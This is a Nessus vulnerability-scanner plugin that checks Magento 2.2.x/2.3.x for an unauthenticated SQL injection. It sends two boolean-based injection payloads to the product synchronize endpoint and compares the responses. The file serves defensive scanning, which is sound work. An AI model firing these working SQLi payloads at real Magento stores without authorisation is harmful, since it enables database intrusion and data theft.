#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(123519);
  script_version("1.2");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_name(english:"Magento 2.2.x < 2.2.8 / 2.3.x < 2.3.1 Unauthenticated SQLi");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is running a PHP application that is affected by a SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Magento application running on the remote web server is affected by a SQL injection vulnerability due to failing 
to properly sanitize the user-supplied 'from' and 'to' inputs to the 'prepareSqlCondition' function of the
'Magento\Framework\DB\Adapter\Pdo\Mysql' class. An unauthenticated, remote attacker can exploit this to execute 
arbitrary SQL statements against the back-end database, leading to the execution of arbitrary code, manipulation of 
data, or disclosure of sensitive information.");
  # https://magento.com/security/patches/magento-2.3.1-2.2.8-and-2.1.17-security-update
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?706392ba");
  script_set_attribute(attribute:"see_also", value:"https://www.ambionics.io/blog/magento-sqli");
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate patch according to the vendor advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H");
  script_set_attribute(attribute:"cvss_score_source", value:"manual");
  script_set_attribute(attribute:"cvss_score_rationale", value:"Based on analysis of public poc exploit.");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2019/03/26");
  script_set_attribute(attribute:"patch_publication_date", value:"2019/03/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2019/03/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:magentocommerce:magento");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:magento:magento");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2019-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("magento_detect.nbin");
  script_require_keys("www/PHP", "installed_sw/Magento");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include('audit.inc');
include('global_settings.inc');
include('misc_func.inc');
include('http.inc');
include('install_func.inc');

#
# Main
#

app = 'Magento';

get_install_count(app_name:app, exit_if_zero:TRUE);
port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];

payload1 = '/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0]' +
  '[product_id][from]=?&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1=1)+--+-';

payload2 = '/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0]' +
  '[product_id][from]=?&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1=0)+--+-';

res1 = http_send_recv3(
  method        : 'GET',
  port          : port,
  item          : dir + payload1,
  exit_on_fail  : TRUE
);

res2 = http_send_recv3(
  method        : 'GET',
  port          : port,
  item          : dir + payload2,
  exit_on_fail  : TRUE
);

# HTTP code 200 or 400 should be a result of the requests
if (typeof_ex(res1) == 'list' && typeof_ex(res2) == 'list' && '400' >< res1[0] && '200' >< res2[0])
{
  extra = 'Nessus was able to exploit the issue using the following requests: \n\n' +
  'GET ' + dir + payload1 + '\n\n' + join(res1, sep:'\n') + '\n\nGET ' + dir + payload2 + '\n\n' + join(res2, sep:'\n') + '\n\n';

  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    extra       : extra,
    sqli        : TRUE
  );
}
else
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, dir);
